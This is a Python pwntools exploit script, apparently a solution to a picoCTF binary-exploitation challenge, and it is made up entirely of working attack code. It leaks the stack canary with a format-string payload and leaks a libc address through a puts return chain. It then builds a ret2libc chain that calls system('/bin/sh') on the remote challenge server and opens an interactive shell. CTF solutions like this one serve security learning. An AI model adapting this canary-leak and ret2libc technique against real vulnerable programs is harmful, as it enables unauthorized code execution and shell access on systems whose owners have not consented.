from pwn import *

p = 0
elf = 0
CANARY = b''
sh = 0
exit = 0
system = 0

def send_payload (payload):
    p.readuntil (b'guess?\n')
    p.sendline (b'-31')
    p.readuntil (b'Name? ')
    log.info ('sending payload...')
    p.sendline (payload)

def padding ():
    payload = b'a'*512
    payload += CANARY
    payload += CANARY
    payload += CANARY
    payload += CANARY
    return payload

def leak_payload (str_leak):
    ## LEAKING LIBC
    payload = padding ()
    puts = elf.plt ['puts']
    leak = elf.got [str_leak]
    exit = 0x080487ff # main <0>
    payload += p32 (puts)
    payload += p32 (exit)
    payload += p32 (leak)
    return payload

def recv_leak ():
    p.recvuntil (b'a'*512 + b'\n\n')
    leak = p.recv (4)
    return leak

def shell_payload (leak):
    libc = ELF ('./libc6-i386_2.27-3ubuntu1.2_amd64.so')
    libc.address = leak - libc.sym ['__libc_start_main']
    
    sh = next (libc.search (b'/bin/sh'))
    system = libc.sym ['system']
    exit = 0x080487ff # main <0>

    log.info ('libc address: %s' % hex (libc.address))
    log.info ('system: %s' % hex (system))
    log.info ('exit: %s' % hex (exit))
    log.info ('sh: %s' % hex (sh))

    payload = padding ()
    payload += p32 (system)
    payload += p32 (exit)
    payload += p32 (sh)
    return payload

def init ():
    global p
    global elf
    global libc
    global CANARY
    while len (CANARY) != 10:
        p = remote ('jupiter.challenges.picoctf.org', 57529)
        elf = ELF ('./server_program')
        p.readuntil (b'guess?\n')
        p.sendline (b'-31')
        p.readuntil (b'Name? ')
        payload = b'%119$p'
        print ('Getting canary')
        p.sendline (payload)
        # Congrats: CANARY_VALUE\n
        #getting read of 'Congrats: '
        p.readuntil ('Congrats: ')
        # CANARY_VALUE + '\n'
        CANARY = p.readline ().strip ()
    #converting to b'0x31313131' string to convert to int
    CANARY = str (CANARY)[2:][:10]
    CANARY = p32 (int (CANARY, base = 16))
    log.success ('CANARY: ' + str (CANARY))

init ()
send_payload (leak_payload ('__libc_start_main'))
libc_start_main = u32 (recv_leak ().ljust (4, b'\x00'))
log.success ('leaked __libc_start_main: %s' % hex (libc_start_main))

send_payload (shell_payload (libc_start_main))

p.interactive ()
